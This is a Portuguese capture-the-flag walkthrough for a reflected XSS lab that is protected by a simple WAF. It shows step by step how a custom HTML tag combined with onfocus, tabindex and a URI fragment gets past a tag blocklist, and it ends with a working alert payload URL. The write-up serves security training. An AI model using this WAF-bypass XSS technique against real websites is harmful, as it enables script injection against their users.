Chall nível 2 - https://bountyleaks.cf/challenge/simple_waf_2.php
1. Ao acessar a página o retorno é ```Please provide search parameter```, mostrando que a aplicação precisa de um parâmetro search a ser provido pelo usuário. (Uffa, não vamos precisar fazer fuzzing de parametros pra ver qual reflete) **// a real é os labs não terem intenção de guessing / ser o mais whitebox possível**
2.  Acessamos https://bountyleaks.cf/challenge/simple_waf_2.php?search=teste
3. Vemos que a palavra teste é refletida
4. Acessamos ```https://bountyleaks.cf/challenge/simple_waf_2.php?search=<img>``` e percebemos que nossa requisição é vista como maliciosa pela aplicação, já que o retorno é que nossa requisição foi bloqueada
5. Acessamos ```https://bountyleaks.cf/challenge/simple_waf_2.php?search=<teste>``` e percebemos que a tag reflete sem problemas.
6. Concluímos, então, que para triggarmos o XSS, precisamos descobrir uma forma de bypassar esse bloqueio, provavelmente feito com base em tags HTML aceitas
7. Você descobre que a aplicação não permite ```<img>``` nem permite ```<IMG>``` (é case insensitive)
8. Você evita utilizar tags conhecidas e parte pra uma abordagem customizada:
8.1 Tendo em vista que testamos no passo 5 a tag teste e ela passou, existem formas de criarmos um payload com essa tag:
- Utilizando os parametros tabindex (tipo um autofocus) e onfocus
- Usamos tambem o # ao final da URL para chamar o elemento html com base em seu ID **(chamado URI fragment - consultar https://www.rfc-editor.org/rfc/rfc3986)**:

https://bountyleaks.cf/challenge/simple_waf_2.php?search=%3Cteste%20id=name%20onfocus=alert(document.domain)%20tabindex=1%3E#name

## Parabéns, você conseguiu triggar o XSS na página \o/
  
O código fonte desse desafio pode ser encontrado aqui:
https://github.com/zeroc00I/eternalnoobchallenges/blob/main/2-simple-waf.php
